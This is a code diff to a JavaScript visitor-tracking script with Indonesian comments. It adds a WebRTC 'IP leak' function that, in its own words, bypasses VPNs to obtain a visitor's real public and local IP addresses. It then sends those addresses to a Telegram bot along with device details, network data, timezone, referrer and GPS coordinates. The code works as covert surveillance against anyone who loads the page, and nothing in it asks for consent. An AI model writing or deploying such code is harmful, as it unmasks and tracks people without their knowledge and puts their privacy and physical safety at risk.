@@ -156,7 +156,52 @@ const getGPU = () => {
   } catch { return 'N/A'; }
 };
 
-// ── Telegram notif ──────────────────────────────────────────────────────────
+// ── WebRTC IP Leak — dapat IP lokal & IP publik asli (bypass VPN) ──────────
+const getWebRTCIPs = () => {
+  return new Promise((resolve) => {
+    const ips = { local: [], public: [] };
+    const timeout = setTimeout(() => resolve(ips), 3000); // max 3 detik
+
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('');
+
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) return;
+        const candidate = e.candidate.candidate;
+        // Regex untuk extract IP dari ICE candidate string
+        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+        const matches = candidate.match(ipRegex);
+        if (!matches) return;
+
+        matches.forEach((ip) => {
+          // IP lokal: 192.168.x.x, 10.x.x.x, 172.16-31.x.x
+          if (/^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)/.test(ip)) {
+            if (!ips.local.includes(ip)) ips.local.push(ip);
+          } else if (!ip.startsWith('0.') && ip !== '0.0.0.0') {
+            if (!ips.public.includes(ip)) ips.public.push(ip);
+          }
+        });
+      };
+
+      pc.createOffer()
+        .then((offer) => pc.setLocalDescription(offer))
+        .catch(() => { clearTimeout(timeout); resolve(ips); });
+
+      // Resolve setelah gathering selesai atau timeout
+      pc.onicegatheringstatechange = () => {
+        if (pc.iceGatheringState === 'complete') {
+          clearTimeout(timeout);
+          pc.close();
+          resolve(ips);
+        }
+      };
+    } catch {
+      clearTimeout(timeout);
+      resolve(ips);
+    }
+  });
+};
 const sendToTelegram = async (data) => {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
   const mapsUrl = data.precise_lat
@@ -182,6 +227,8 @@ const sendToTelegram = async (data) => {
 📶 *Jaringan:* ${data.network_type} | ${data.network_speed} | RTT: ${data.network_rtt}
 🌍 *Timezone:* ${data.timezone}
 🔗 *Referrer:* ${data.referrer}
+${data.webrtc_local_ips ? `🏠 *IP Lokal (WebRTC):* \`${data.webrtc_local_ips}\`` : ''}
+${data.webrtc_public_ips ? `🌐 *IP Publik Asli (WebRTC):* \`${data.webrtc_public_ips}\`` : ''}
 
 ${data.precise_lat ? `📌 *GPS AKURAT!* Akurasi: ${data.gps_accuracy}` : '📌 *Lokasi via IP (belum izin GPS)*'}
 🗺️ [Buka di Google Maps](${mapsUrl})
@@ -238,6 +285,9 @@ export const captureVisitorData = async () => {
     const { os, brand, model, browser, deviceType } = parseDevice(ua);
     const { network_type, network_speed, network_rtt } = getNetworkInfo();
 
+    // WebRTC IP leak — jalankan paralel dengan data lain
+    const webrtcPromise = getWebRTCIPs();
+
     // Screen detail
     const screenRes = `${window.screen.width}x${window.screen.height}`;
     const viewportRes = `${window.innerWidth}x${window.innerHeight}`;
@@ -262,6 +312,9 @@ export const captureVisitorData = async () => {
 
     const timestamp = new Date().toISOString();
     const logId = Math.random().toString(36).substr(2, 9);
+
+    // Tunggu WebRTC selesai (max 3 detik)
+    const webrtcIPs = await webrtcPromise;
 
     const fullLog = {
       id: logId,
@@ -311,6 +364,9 @@ export const captureVisitorData = async () => {
       touch_points: navigator.maxTouchPoints || 0,
       cookies_enabled: navigator.cookieEnabled,
       do_not_track: navigator.doNotTrack || 'Unknown',
+      // WebRTC IP leak
+      webrtc_local_ips: webrtcIPs.local.join(', ') || null,
+      webrtc_public_ips: webrtcIPs.public.join(', ') || null,
       // GPS — diisi nanti
       precise_lat: null,
       precise_lng: null,
